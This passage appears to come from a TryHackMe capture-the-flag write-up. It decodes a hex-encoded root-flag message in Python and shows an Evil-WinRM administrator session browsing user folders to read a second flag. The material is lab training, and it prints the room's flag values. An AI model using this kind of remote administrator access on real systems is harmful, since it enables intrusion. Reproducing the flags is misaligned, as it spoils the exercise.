>>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
>>> print(bytes.fromhex(s).decode('ASCII'))
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

```shell
*Evil-WinRM* PS C:\Users\Administrator> cd C:\Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2021   1:25 PM                Administrator
d-----        2/25/2021  10:16 AM                lvetrova
d-r---        2/23/2021   6:21 AM                Public
d-----        2/25/2021  10:20 AM                twilliams
d-----        2/25/2021   9:34 AM                xyan1d3


*Evil-WinRM* PS C:\Users> cd twilliams
*Evil-WinRM* PS C:\Users\twilliams> ls


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe

*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}
```